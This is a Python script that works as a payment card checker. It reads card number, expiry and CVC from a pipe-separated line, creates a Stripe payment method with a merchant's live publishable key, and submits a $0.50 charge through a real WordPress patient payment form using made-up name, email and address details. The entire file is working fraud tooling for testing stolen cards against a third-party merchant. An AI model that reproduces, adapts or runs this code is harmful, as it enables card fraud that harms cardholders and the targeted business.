import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F6671a0211f%3B+stripe-js-v3%2F6671a0211f%3B+card-element&key=pk_live_51RQV5kGAIBYDmNVzqhTEEAkHL2GCWfuFKhiIyjnr7lKYGG6mgIc4Boj71MPD2dMHPjw7BHcWqw2asYbRMtLylrTo00IyNhMakJ'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-05%2009%3A12%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fspecializedplace.com%2Fpatient-payment-form%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-10-05%2009%3A12%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fspecializedplace.com%2Fpatient-payment-form%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fspecializedplace.com%2Fpatient-payment-form%2F',
    '__stripe_mid': 'f3479134-ccc1-45ed-b8cb-17d142e36526356147',
    '__stripe_sid': 'efbcc7c5-9ab6-4d1a-a3c8-26a1000753b6d5fa7f',
	}
	
	headers = {
	    'authority': 'specializedplace.com',
    'accept': '*/*',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1738074899389.221067656921165998; cookieyes-consent=consentid:Z05IWVhRVUM2RHZ1NVg3ZXNIcG5LZFBiMTh0T3Y3QmY,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; lp_session_guest=g-67bd3c4a08e89; __stripe_mid=518df6a0-8b5e-46b9-9780-52b781a8bfaa4bcd78; __stripe_sid=a329dec2-2c4c-4bba-883c-94c9ced91ff614254e',
    'origin': 'https://specializedplace.com',
    'referer': 'https://specializedplace.com/patient-payment-form/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1759655586137',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=1096&_fluentform_5_fluentformnonce=18c78c0e7b&_wp_http_referer=%2Fpatient-payment-form%2F&input_text=Benni&email=gtwo578%40gmail.com&input_text_1=Niko&dropdown=Other&address_1%5Baddress_line_1%5D=17%20Allen%20street&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&custom-payment-amount=0.50&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '5',
	}
	
	r2 = requests.post(
	    'https://specializedplace.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	return (r2.json())
